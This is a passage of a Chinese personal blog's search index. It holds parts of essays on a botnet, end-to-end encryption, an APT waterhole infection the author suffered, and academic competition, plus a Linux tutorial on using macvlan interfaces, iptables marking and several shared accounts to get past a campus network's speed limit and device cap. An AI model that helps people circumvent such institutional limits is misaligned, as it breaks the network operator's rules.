关于个人安全，其实我没有发言权，毕竟我也曾踩过别人的水坑 但是我还是要说一句，就是保持差异化，默认的配置只会给攻击者创造便利 再加一句，不要把自己的安全完全托付在别人手中 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:2:3","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#关于个人安全"},{"categories":["event"],"content":"参考链接 运营商收回公网 IP 的原因之一 一个藏在我们身边的巨型僵尸网络 Pink 用户端设备ONU被肉鸡攻击实例浅析 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:3:0","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#参考链接"},{"categories":["thinking"],"content":"不懂专业知识和受新闻媒体等内容的误导可能使人产生虚假的安全感，这会使你的安全防线留下缺口；而夸大危险可能使人放弃抵抗，从而使自己完全暴露在危险之下","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/"},{"categories":["thinking"],"content":"凌晨3点，一阵凉风把我吹醒 我点亮手机屏幕，一条推送新闻映入眼帘：“苹果公司让iCloud Safari书签也实现端到端加密” ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:0:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#"},{"categories":["thinking"],"content":"端到端加密 “端到端加密”，他们总喜欢用这样一些看起来高大上的词汇 我对这个词颇为熟悉，原本不想多说，但为了本文的部分读者，我还是稍微解释一下为好 所谓的“端”，即指你的客户端，该新闻中指你的苹果设备 “端到端加密”就是说你的数据在对外传输之前会进行加密，只会在接收的客户端进行解密，而在网络传输和苹果的数据库存储这些中间过程中不进行任何解密操作，这就能保证你的数据只有你可见，其他中间人看到的都只是加密的数据，从而保证你的数据安全 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:1:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#端到端加密"},{"categories":["thinking"],"content":"安全吗？ 很明显，苹果此举是为了保证你的数据安全，但这样是不是就保证了你的数据除了你之外没有人可以看到呢？ 先别急着回答，让我们先来捋一下： 现代密码学保证数据被加密后其他人看不到原文（期望上如此） 端到端加密保证了数据离开你的设备后呈现的都是密文状态 这样看来，端到端加密理论上可以保证你的数据别人看不到 再来看看这条推送新闻: 据 Reddit 论坛信息，苹果“iCloud 安全概述”页面的更新显示，与 Safari 标签和历史记录相同，Safari 书签现也更新为端到端加密。 这意味着任何人，甚至是苹果，都无法访问用户保存的 Safari 书签。 新闻中都这样说了，不管懂不懂，反正我们便要相信它了 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:2:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#安全吗"},{"categories":["thinking"],"content":"真的如此吗？ 等等！！！真的如此吗？ 我在苹果的ToS中发现了这样一段话： 您确认并同意，Apple 在其认为合理必要或适宜的情况下可以访问、使用、保存您的帐户信息和任何内容以及/或者将您的帐户信息和内容披露给执法机构、政府官员和/或第三方而无需向您承担任何责任 来自：https://www.apple.com/legal/internet-services/icloud/cn/terms.html 如果他们真的无法解密你的数据，那他们如何将你的数据提供给执法机构呢？ 前面的内容我们似乎都忽略了非常重要的一点：真正用来加密数据的密钥由谁持有？ 根据我的编程经验，我们通常不会使用用户的密码直接来加密数据，主要有以下原因： 用户的密码通常不够长，不符合安全密钥的长度要求 如果用户修改密码，使用密码直接加密数据需要对所有数据重新加密，这很耗时耗资源 数据库中通常不会存储明文密码，如果用户忘记了密码，则用户数据便无法恢复了 我们一般通过以下方法之一来解决问题： 直接生成符合要求的随机密钥，然后用用户密码来加密存储密钥 直接生成符合要求的随机密钥，建立用户与密钥的映射，所有密钥由服务商统一加密保存 不难看出，使用用户密码加密存储密钥，这种方案在服务商不存储用户密码明文（或者其他任何可以用来解密密钥的信息）的情况下，安全性很高，但是如果用户忘记密码则难以恢复用户数据 而在实际工程化的解决方案中，为了能够在特殊情况下为用户恢复珍贵的数据，通常密钥不会直接交由用户持有，而是通过服务商的安全基础设施和安全承诺信用来保证的 那苹果是采用哪种方案呢？ 我在苹果的 iCloud security overview 一文中找到了这样的内容： On each of your devices, the data that you store in iCloud and that’s associated with your Apple ID is protected with a key derived from information unique to that device, combined with your device passcode which only you know. No one else, not even Apple, can access end-to-end encrypted information. 翻译：在你的每台设备上，你存储在iCloud中并与你的Apple ID相关联的数据，都受到来自该设备独有信息的密钥的保护，并与只有你知道的设备密码相结合。其他任何人，甚至是苹果，都不能访问端到端加密的信息。 Data types that are protected by end-to-end encryption—such as your Keychain, Messages, Screen Time, and Health data—are not accessible via iCloud Data Recovery Service. 翻译：受端到端加密保护的数据类型–如你的钥匙串、信息、屏幕时间和健康数据–不能通过iCloud数据恢复服务访问。 通过这句话可以推测，苹果应该采用的是用用户密码来加密密钥的方案，这很安全 但这是真的吗？苹果在这方面一直保持闭源，没有任何外部人员可以确认这一点，这些承诺会不会成为“虚假的安全感”呢？ 说了这么多，其实我们就想知道服务商到底能不能在不经我们允许的情况下解密我们的数据 注意 这里的“允许”不是说整个弹窗让我们点一下同意按钮，而是真正需要我们提供一个“秘密”才能继续解密下去 我想起了之前看到的 “泥坑实验” 把你的设备扔进一个泥坑中 滑入泥坑中，并砸碎自己的脑袋。当你恢复意识时，你将完全恢复，但是你将永远无法回忆起你的密码和密钥等内容 尝试恢复你备份在云端的数据 实验可能难以真正实施，但是可以采取一些其他的折中手段，比如假装自己失忆，说一些谎言啥的 无论用了什么办法（证明自己身份、找司法机关帮助、和库克是好朋友等等），如果你可以成功恢复你的数据，那代表着你的数据不是真正的安全 你应该能明白这意味着什么，暂且不说司法部门等合法要求解密数据，只要服务商有途径解密数据，入侵者就有可能不经过你的同意获得你数据的明文 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:3:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#真的如此吗"},{"categories":["thinking"],"content":"虚假的安全感 我们都相信“没有绝对的安全”，但我更有理由相信，比知道“不安全”更可怕的情况是，认为自己处于“安全”的位置，我称其为“虚假的安全感” 就像前面新闻中提到的那样，如果读者对相关知识和加密方案没有了解，就会被文中的词汇迷惑，完全相信文中那些并非由服务商自己说出的承诺（即使是服务商自己承诺的，也不完全可信） 在这种情况下，如果你相信自己交给服务商的数据完全安全，就有可能在未来的某一天被其反噬 其实，这种“虚假的安全感”在很多地方都有可能发生，我可以给大家讲一个发生在我自己身上的真实故事，相关细节我会进行模糊处理 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:4:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#虚假的安全感"},{"categories":["thinking"],"content":"被攻击的真实案例 某天上午，我同时接到导员和党委书记的电话，说学校网络管理部来了两个工作人员，让我带着电脑过去给他们提供一点帮助。我没有多想，背着电脑包屁颠屁颠的过去了，却发现不是学校网管，而是某部门来了两个人 他们详细询问了我近一个月的网络活动，询问我是否与某列表中国外某些黑客组织有联系，并检查了我的笔记本电脑。反正我也没做坏事，按照流程走下来也没发现什么异常，但他们给我看的某个网址给我留下了印象 回去后，我找到了那个网页，那是FreeBuf中的一篇文章，内容是Google纰漏的一起APT攻击的相关情报。我根据其内容找到了Google原文并找到了更多信息，当晚我根据相关思路对我的电脑进行了细致的检查，最终发现了一个异常进程 通过对该程序进行逆向分析，我发现样本与Google纰漏的样本虽有不同，但诸多特征和证据表明其与该APT组织的攻击程序同源，由此证明我的电脑遭遇了国外APT组织的攻击 我马上联系了他们，他们坦白的确是因为这个原因来找我的。根据他们的监控，这是此APT组织发起的第三波攻击，国内有其他安全研究者也同样中招 通过对我电脑中文件写入记录（可以修改的）、服务添加记录、路由器中的上网日志、学校的DNS日志等信息进行综合分析，基本确定被攻击的大体时间范围和攻击手段 通过结合当天微信聊天记录，我回忆起被攻击当天我在研究某服vpn客户端，上网查了一些相关研究案例，而结合Google纰漏的情报，我极有可能触发了他们的水坑，通过浏览器漏洞执行了黑客的恶意代码 这个事件到这里并没有结束，我想说的关键才刚刚开始 被攻击的时间点前两周我刚重装了系统，最新的Windows10打上所有安全补丁，最新的Chrome浏览器。通常认知下，将系统和软件更新到最新并打上安全补丁，应对基本的网页浏览是基本可以放心的 但实际情况就这样狠狠的打了脸，事实证明，那些我以为的最新版带来的安全感都是“虚假的安全感”，在真正的攻击面前毫无招架之力 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:4:1","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#被攻击的真实案例"},{"categories":["thinking"],"content":"夸大危险也许更加可怕 我不想我的读者读了我上面的内容，产生“反正世界上没有绝对的安全，无论怎么努力都仍暴露在危险之下，那还努力个啥？”的想法 我上面的内容的确夸大了大家面临的危险，绝大多数人都没有被攻击的价值 相比“虚假的安全感”，“夸大危险”也许更加可怕，因为认为危险无法避免而放弃抵抗的案例比比皆是 举一个身边最真实最普遍的例子，大家在拥有了安全研究经验后，往往会发现几乎所有现有的杀毒软件等难以发现和阻拦最新的0day攻击，所以大家往往干脆不安装杀毒软件 要知道，即使是最小的防御措施也能够起到一定的阻拦作用，虽然无法阻拦最新的0day，但是面对各种脚本小子还是能够轻易防护的，无论如何都比没有强 夸大的危险极易使人放弃抵抗，从而使自己暴露在更大的危险之下，这比“虚假的安全感”更加可怕 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:5:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#夸大危险也许更加可怕"},{"categories":["thinking"],"content":"我的态度 我还年轻，经验太少 我面对危险和安全的态度也许会随着之后的人生经历而产生变化，但无论如何我还是记录以下我现有的想法吧 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:6:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#我的态度"},{"categories":["thinking"],"content":"资产梳理 我的第一个想法是资产梳理，对自己有价值的东西进行梳理，包括各类物理可接触的东西和虚拟不可接触的数据 正所谓“知己知彼，百战不殆”，如果自己都不知道自己拥有那些有价值的东西，那几乎就等于将这些遗忘的东西拱手让人 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:6:1","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#资产梳理"},{"categories":["thinking"],"content":"价值分级 然后是价值分级，按照资产的价值高低对所拥有的东西和数据进行划分不同等级 这很好理解，高价值的东西采取高安全性的措施，低价值的东西可以稍微放松一点 毕竟较高的安全性往往带来复杂性的增加，而人的精力有限，无法对所有内容都采取最高安全措施 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:6:2","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#价值分级"},{"categories":["thinking"],"content":"谦虚与谨慎 我看到上面案例中的两个人，他们习惯于用随身携带的笔记本记录内容，习惯于使用不可多次写入的CD光盘来传输数据，习惯于用手随时遮挡正在书写的内容 虽然他们的安全技能高出常人许多，但他们对各种小细节都保持者最大的谦虚和谨慎，我认为这是保证安全性的最基本也是最重要的东西 ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:6:3","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#谦虚与谨慎"},{"categories":["thinking"],"content":"拓展阅读 iCloud: Who holds the key? NkkySjVweW81NXFHNVlXMTVaS000b0NkNTRpeDZMQ0I2TENCNG9DZDZZTzk1WStxNUx5YTViaW01cDJsNXB1MDVhU2E1NXFFNVkyeDZabXA= ","date":"2021-10-05","objectID":"https://zu1k.com/posts/thinking/false-sense-of-security/:7:0","series":null,"tags":["thinking"],"title":"虚假的安全感","uri":"https://zu1k.com/posts/thinking/false-sense-of-security/#拓展阅读"},{"categories":["thinking"],"content":"“干！他妈的我被卷了。我不能接受！” 一个研究生学长这样告诉我。 这是我提前选修的研究生课程，按照提交的文档评成绩，本是上个学期的课程却拖到这个学期末才出成绩。我很诧异自己拿到的成绩没有过平均线，但历年来该课程老师的极低评价我也有所耳闻，因此自己也算能够勉强接受。 然而那个研究生学长却没听说过该老师，算是踩了个大坑。他的学习态度我是见过的，很努力很刻苦，最后给他不到70分的成绩和倒数的名次给谁也接受不了，我建议其申请成绩复议。后来他跟我说，那个老师给他发了第一名97分的文档，人家提交了21页，足足有1万5千字。而他只提交了3000字。 所以我知道了，我应该也被狠狠的卷了，因为我也只提交了3000字。但我拿到了80分（草，没过平均线），虽然没有什么用。我拿到了那份21页的文档，原来也是提前选修的同学，是个女生，见过几面，挺温柔的，所以我不想批判她。（我劝各位读者不要他妈多想） 亲身经历过内卷（是被卷的一方），这段时期又刮起一阵反内卷风，B站各种《内卷的名义》等反内卷题材小短片，“躺平”这个词被大众广泛接受（我不喜欢内卷，但也不支持躺平），我就想，是时候写点东西了。可能不是很深刻，但也算是我在这个时期的一扑棱，毕竟还是有同学和陌生人来看我写的文字的，感谢大家。 ","date":"2021-06-17","objectID":"https://zu1k.com/posts/thinking/fuck-involution/:0:0","series":null,"tags":["thinking"],"title":"干！有人在卷我","uri":"https://zu1k.com/posts/thinking/fuck-involution/#"},{"categories":["thinking"],"content":"我参与过内卷吗？ 在开始之前，我想先回答这个问题：“我参与过内卷吗？”。毕竟大家都不喜欢内卷（我想至少我的读者应该是这样的），我不想一开始就成为大家口中的“内卷人”。 对于这个问题，我想，应该没有吧。 但是我想让大家来评判，请看以下两个例子，算是学生阶段能够遇到的两个最典型最容易产生内卷的场合： 要交课程报告。虽然没有规定字数，但我坚决不会让我的报告低于3000字，一般写3200-3500字。我认为这是学生提交报告的本分，至少不要让老师觉得你太敷衍吧。 要期末考试了，得提前复习。虽然平时上课我都会仔细听（认识我的别打我啊，我可是每堂课都坐前几排的，虽然在老师眼皮底下玩手机真的很爽，虽然我不做任何笔记，但是我真的有仔细听课），但考试前还是要好好复习的，提前一个周吧，考试前两天会疯狂背书和做题。 一些身边人的情况： 课程报告，没规定字数和格式是吧，那先来他2w字。什么封面、目录、图片、表格能有的全给他整上，内容要分章节，最好不少于5章，最后还要有总结和引用文献。关键内容要加粗和标红，不能让审阅老师看不到啊。什么，你说内容？内容谁看啊，管他合不合适，只要与主题有点关系的先写上再说，反正多出来的又不会扣分。（真事，大一下，找那个老师理论，她坦然承认自己评阅标准有问题，但是不能改分。她承诺我后面如果哪门课感觉要挂，可以找她，她帮我去找相关老师求情。？？？？？？？去她妈的！我会挂科吗？她这算放了一个屁吧朋友们） 期末考试，那不得提前两个月甚至半个学期就开始复习和刷题了。课后题啥的做不到完全背过那答案总得背过吧。光看课本和PPT那怎么行，吉米多维奇不得刷他个3遍以上，然后历年考试题也得整一下吧。到考试了，全他妈是吉米多维奇上的原题，这不得写他个两种甚至三种解法。（也是真事，这些人也真是，我可不想为了八十分与九十分的差距付出这个时间） 所以，你说我参与过内卷吗？这样看来我是不是很正常吧。 ","date":"2021-06-17","objectID":"https://zu1k.com/posts/thinking/fuck-involution/:1:0","series":null,"tags":["thinking"],"title":"干！有人在卷我","uri":"https://zu1k.com/posts/thinking/fuck-involution/#我参与过内卷吗"},{"categories":["thinking"],"content":"是什么造成了内卷？ 内卷的产生不是偶然，内卷的环境+不合理的评判标准+竞争的人导致了内卷的必然发生，至少我是这样认为的。 所谓内卷的环境，那必然要是金字塔形状，底层占绝大多数，只有少数人可以上升，这样就会形成竞争的原因。甚至要严格限制上升的人数，这样才能使竞争更加激烈，才会孵化出各种竞争手段。 有了引起竞争的条件，形成的是竞争的行为，如果评判标准合理，最终的结果是通过健康的竞争选拔出真正有实力的人，这应该是一个正向的积极的过程。可惜，绝大多数情况这个评判标准并不合理，更有为了利益为了压榨故意采用恶心人的标准的，比如企业里面单纯通过工作时长来评判、比如老师单纯通过字数来评判等等。 这就是恶心人的地方，拥有决定权的人通过设立不合理的评判标准，故意引起底层内卷，从而满足自己的利益。而作为内卷的主要参与者———竞争的人，却是这三个条件中最可怜的那一部分，不仅需要付出大量努力、时间等参与到内卷中，还有很大几率无法在内卷中脱颖而出，从而白白浪费了自己的时间精力等；他们还需要承受内卷同仁的满满的恶意，竞争者之间往往就是这样，在内卷局中的人难以看清形势，难以把矛头对准真正掌握规则、真正引起内卷的上层管理者和标准制定者，他们只会在底层互相伤害。真是可悲啊。 ","date":"2021-06-17","objectID":"https://zu1k.com/posts/thinking/fuck-involution/:2:0","series":null,"tags":["thinking"],"title":"干！有人在卷我","uri":"https://zu1k.com/posts/thinking/fuck-involution/#是什么造成了内卷"},{"categories":["thinking"],"content":"如何摆脱内卷？ 这个问题我无法给出答案，因为我也不知道。毕竟就目前的形势而言，只要内卷的条件还存在，就总会有人参与其中。我个人认为要打破这个局，还是需要从上而下的反内卷，底层难以闹出风浪。 但就目前情况来看，貌似上面并不想真正反内卷。可能迫于底层舆论压力，他们会增加反内卷的宣传。可这有什么用，不打破内卷的条件，只要内卷的环境和不合理的评判标准还存在，内卷就不会减轻。他们可真是坏啊，他们想要从底层的内卷中获利。 也许，真正的社会主义社会是划破黑暗的那一束光，她会是吗？ ","date":"2021-06-17","objectID":"https://zu1k.com/posts/thinking/fuck-involution/:3:0","series":null,"tags":["thinking"],"title":"干！有人在卷我","uri":"https://zu1k.com/posts/thinking/fuck-involution/#如何摆脱内卷"},{"categories":["thinking"],"content":"我是否曾从内卷中获利？ 这个问题我必须回答“是”，甚至还有点小开心。因为我不是以内卷者的身份参与其中，不需要付出任何努力，通过他们的内卷和恶性竞争，我作为一个旁观者可以直接获利。 不说当年的各种打车软件之间恶性竞争、疯狂烧钱，打一次车只需要一分钱，那个时候我还上初中，哪懂什么内卷。 就看大学这两年，校外那条小吃街。起初只有一家羊肉汤店，算是这条街羊肉汤方面的绝对垄断，价高味不美，肉还不多。去年其隔壁新开了另一家羊肉汤店，一开始还只是两家的老板娘到店门口招呼人进各自的店，慢慢的两家开始让利，一家店搞抽奖送饮料送凉菜，另一家店直接进店即送葱油饼。 两家店卷起来了，我们这些看热闹的吃客可开心的很，免费的饼吃着，免费的饮料喝着，连碗里的羊肉也变多了。 你说内卷好不好？老板娘肯定烦得很，但我们这些从中获利的人怎么会放过她们。 ","date":"2021-06-17","objectID":"https://zu1k.com/posts/thinking/fuck-involution/:4:0","series":null,"tags":["thinking"],"title":"干！有人在卷我","uri":"https://zu1k.com/posts/thinking/fuck-involution/#我是否曾从内卷中获利"},{"categories":["thinking"],"content":"卷我可以，请换种方式 这个环境就是这样一个环境，大家都是底层，都想要更高的名次、更好的待遇、更多的钱，那就总有人要付出更多的努力和汗水。对于这些努力的人，我选择原谅他们上进的心，但我绝对不原谅他们卷我采用的手段和方式。我看不起你刷更多的题而没有把时间投入到自己真正感兴趣的领域，我看不起你拼凑更多的文字却没有包含自己丁点的思考，用这种方式来卷我简直就是在侮辱我，在侮辱每一个共同学习一起进步互相竞争的同伴。 如果你真想卷我，请换种方式。我希望你的内容包含更深刻的理解，或者在追寻更尖端的研究热点；我希望你的工作有更高的技术含量，或者给更多的人带来便利；我希望你的答案有更深入的思考，或者有你自己的东西在里面。请让被卷的我感受到来自竞争者的尊重，让我输的心服口服，让我能够去尊重你。 ","date":"2021-06-17","objectID":"https://zu1k.com/posts/thinking/fuck-involution/:5:0","series":null,"tags":["thinking"],"title":"干！有人在卷我","uri":"https://zu1k.com/posts/thinking/fuck-involution/#卷我可以请换种方式"},{"categories":["thinking"],"content":"最后，可乐 这个也是前段时间看到的，你说可口可乐和百事可乐也是在竞争，为啥可乐的价钱不下跌呢？ 之前也没思考过这个问题，一开始也就想已经把价格压到一个比较低的价位了，再降价可能不太值？毕竟一些国产汽水的价格也不低。 现在想想肯定没有这么简单，已经是完善的大规模工业化生产流程了，生产瓶汽水平均成本很低，这个价应该还有不低的利润空间，那他们为何不通过降价来抢夺市场，为啥不像国内之前打车软件那样甚至不惜倒贴钱来竞争呢？ 我怀疑是他们脑子正常，搞明白了内卷的损人不利己，清楚恶性竞争的危害…… 最后祝大家都能够成功摆脱内卷，可以像交大cxs一样，可以不参与内卷但仍有机会凭借自己的实力得到自己满意的结果。 ","date":"2021-06-17","objectID":"https://zu1k.com/posts/thinking/fuck-involution/:6:0","series":null,"tags":["thinking"],"title":"干！有人在卷我","uri":"https://zu1k.com/posts/thinking/fuck-involution/#最后可乐"},{"categories":["tutorial"],"content":"校园网被限速了，受不了垃圾网速，动手搞了单线多拨网速叠加","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/"},{"categories":["tutorial"],"content":"记得大一刚入学时，免费的校园网是上下行对等的100Mbps带宽，虽然赶不上家里的速度，但是用起来还是比较舒服的 万万没想到，当别的学校都在忙着升级成千兆网络的时候，自己学校竟然来了个反向操作，30Mbps限速，真TMD鬼，不知道怎么想的 这垃圾校园网，我是忍不了了，考虑到每个人都能多个设备同时登录，肯定就有多拨的可能，那就搞起来！ ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:0:0","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#"},{"categories":["tutorial"],"content":"Linux下手工操作 本着学习的态度，上来肯定要先在Linux下手动操作一遍（其实我是先用iKuai验证可行后，才尝试用Linux手工配的 我们的基本思路是： 拿到多个IP 过了学校的联网认证 进行负载均衡 以下所有操作都需要root权限 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:0","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#linux下手工操作"},{"categories":["tutorial"],"content":"利用macvlan获取多个IP 首先要创建多个虚拟网络接口，利用不同的Mac地址进行DHCP获取多个不同的IP地址 在Linux下，内核提供的macvlan就可以实现我们的需求，从Linux Kernel 3.9开始就支持了貌似，所以只要不是安装非常老的系统都是支持的 查看一下你的系统是否支持： # modprobe macvlan # lsmod | grep macvlan macvlan 24576 0 如果显示类似上面的内容就表示支持 添加一个macvlan类型的网络接口： ip link add link \u003cphysical-network-interface-name\u003e \u003cnew-network-interface-name\u003e type macvlan 例如，通过 ip addr 或者 ifconfig 查看到物理网卡名为 eth0，新网络接口名我们用 vmac0 vmac1 这样的表示，命令如下： ip link add link eth0 vmac0 type macvlan ip link add link eth0 vmac1 type macvlan 这样就创建了两个新的网络接口，依附于物理接口 eth0，两个新网络接口的mac地址是自动分配的，每一次新建都会随机生成。 如果想要手动指定mac地址，可以使用下面的命令: ip link add link \u003cphysical-network-interface-name\u003e \u003cnew-network-interface-name\u003e address \u003cmac-address\u003e type macvlan 例如： ip link add link eth0 vmac0 address 11:22:33:44:55:66 type macvlan 技巧 更加详细的命令通过 ip link help 和 man ip link 查看 经过上面这一步，就就可以通过 ip link 看到多了两个网络接口 4: vmac0@eth0: \u003cBROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 5a:5d:f9:1e:b8:19 brd ff:ff:ff:ff:ff:ff 5: vmac1@eth0: \u003cBROADCAST,MULTICAST\u003e mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 66:50:b5:23:d8:ce brd ff:ff:ff:ff:ff:ff 然后需要获取到多个IP，直接执行 dhclient 即可 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:1","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#利用macvlan获取多个ip"},{"categories":["tutorial"],"content":"进行联网认证 我们学校用的是深澜的认证系统，对其认证流程分析后，写了一个小工具:多账号登录认证工具 信息 2021年11月4日 更新 用Rust写了一个新的登录工具，更轻量更好用 https://github.com/zu1k/sdusrun 在启动前先修改配置文件，username为学号，password为上网认证的密码，ip分别写刚刚 macvlan 获取到的IP 学校限制的每个人最多5台设备同时在线，新登录的设备会把前面的设备顶下去，所以最好联合舍友用多个人的账号进行认证 login: - username: 201XXXXX1 password: user1-password ip: 10.0.0.1 - username: 201XXXXX1 password: user1-password ip: 10.0.0.2 - username: 201XXXXX2 password: user2-password ip: 10.0.0.3 注意 认证成功后即可进行下面的步骤，如果认证失败需要检查账号密码是否正确，本工具也不能保证后续系统更新后仍能使用，必要时可登录认证后台手工添加mac认证白名单 ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:2","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#进行联网认证"},{"categories":["tutorial"],"content":"进行路由级别的分流 经过上面的步骤，其实现在已经有多个可以上网的接口了，每一个接口都限速30Mbps，可以通过修改路由表验证，但是测速发现还是总速度还是30Mbps，速度并没有叠加 这其实是因为你的主机只有一个默认网关，流量实际上只走了一条线，所以还是受单接口限速的限制。我们的目的是让流量能够分别走多个接口，从而达到速度叠加的效果，也就是常说的负载均衡 思路是：通过iptables规则给数据包打上标记，然后通过策略路由根据标记来选择走哪个接口出去。需要注意不同包之间的关系，追踪连接状态并恢复标记，否则的话同一个连接的不同包走了不同的接口，会被丢弃掉。 创建路由表 首先创建多个路由表，因为每一个路由表只能默认走一个接口，所以刚刚创建了多少虚拟网络接口，这里就要增加几个路由表，我按照2个接口来演示 编辑 /etc/iproute2/rt_tables 文件，在文件末尾增加两个路由表 # 新增的路由表 100 vmac0 101 vmac1 保证新路由表中没有条目，先清空一下 ip route flush table vmac0 ip route flush table vmac1 分别为两个路由表增加默认路由项，分别走不同的网络接口 ip route add 0/0 dev vmac0 table vmac0 ip route add 0/0 dev vmac1 table vmac1 配置iptables 分别创建多个新的链 iptables -t mangle -N VMAC0 iptables -t mangle -A VMAC0 -j MARK --set-mark 0x100 iptables -t mangle -A VMAC0 -j CONNMARK --save-mark iptables -t mangle -N VMAC1 iptables -t mangle -A VMAC1 -j MARK --set-mark 0x101 iptables -t mangle -A VMAC1 -j CONNMARK --save-mark 配置打标记的规则，每两个包（只看新建的连接）中第一个交给VMAC0处理，第二个交给VMAC1处理 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A OUTPUT -o vmac+ -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A OUTPUT -o vmac+ -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 配置策略路由 下面需要配置策略路由，根据我们设置的策略，流量分别由多个路由表进行路由，所以就可以走多个网络接口了 我们让防火墙标记为0x100的用vmac0路由表，标记为0x101流量的用vmac1路由表 ip rule add fwmark 0x100 table vmac0 ip rule add fwmark 0x101 table vmac1 此时会出现一个问题，就是从外部发起的连接在进来后并没有打上防火墙标记，所以返回的包只能走默认的路由表。假如我们的默认路由表的默认路由是走vmac0，那来自vmac1的请求的响应包也会走vmac0出去，因为不属于同一个连接，这个包就会被丢掉。 我们的解决方法是再增加两条规则，来自哪个网卡的包的响应就从该网卡出 ip rule add from \u003cvmac0-ip\u003e table vmac0 ip rule add from \u003cvmac1-ip\u003e table vmac1 用作路由器 如果这台linux需要用作网关，需要配置PREROUTING链，这里假设内网网段为 192.168/16 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 0 -j VMAC0 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state NEW -m statistic --mode nth --every 2 --packet 1 -j VMAC1 iptables -t mangle -A PREROUTING -s 192.168/16 ! -d 192.168/16 -m state --state ESTABLISHED,RELATED -j CONNMARK --restore-mark 同时需要对内网流量进行SNAT iptables -t nat -A POSTROUTING -o vmac+ -j MASQUERADE 经过上面的步骤，已经能够利用多个网络接口了。不过我们本质上是通过连接分流的，同一个连接的所有包会走同一个接口出去，所以如果你的程序是单线程网络，就看不到加速效果。可以通过speedtest多线程来进行测试，可以看到明显的网速叠加。 注意 我刚刚的演示重启后虚拟网卡会丢失，因为自动分配的mac地址，重新运行命令会导致mac和ip变动，需要重新认证 可以使用指定mac地址的方法创建，也有持久化虚拟网卡的方法，可以一劳永逸 后面会将更加成熟的方法，这里手工配置不是重点，需要的自行学习研究吧！ ","date":"2021-04-11","objectID":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/:1:3","series":null,"tags":["Linux","多拨"],"title":"垃圾校园网，我忍不了了","uri":"https://zu1k.com/posts/tutorials/campus-network-speed-overlay/#进行路由级别的分流"},{"categories":["tutorial"],"content":"进行路由级别的分流 经过上面的步骤，其实现在已经有多个可以上网的接口了，每一个接口都限速30Mbps，可以通过修改路由表验证，但是测速发现还是总速度还是30Mbps，速度并没有叠加 